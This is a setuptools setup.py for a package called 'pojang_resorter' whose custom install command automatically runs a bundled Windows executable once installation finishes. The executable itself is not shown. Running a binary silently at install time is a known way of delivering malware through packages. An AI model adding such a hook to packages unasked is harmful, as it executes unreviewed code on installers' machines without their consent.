from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import subprocess

# Define a custom install command that runs your .exe after installation
class PostInstallCommand(install):
    def run(self):
        # Run the standard install process
        install.run(self)

        # Path to the executable (use install_lib to find the correct path after installation)
        exe_path = os.path.join(self.install_lib, 'pojang_resorter', 'your_executable.exe')

        # Check if the executable exists and run it
        if os.path.exists(exe_path):
            print(f"Running {exe_path}...")
            subprocess.run([exe_path], check=True)

# Setup function for your package
setup(
    name='pojang_resorter',
    version='1.25',
    packages=find_packages(),
    include_package_data=True,
    cmdclass={
        'install': PostInstallCommand,  # Use the custom install command
    },
    # other metadata
)
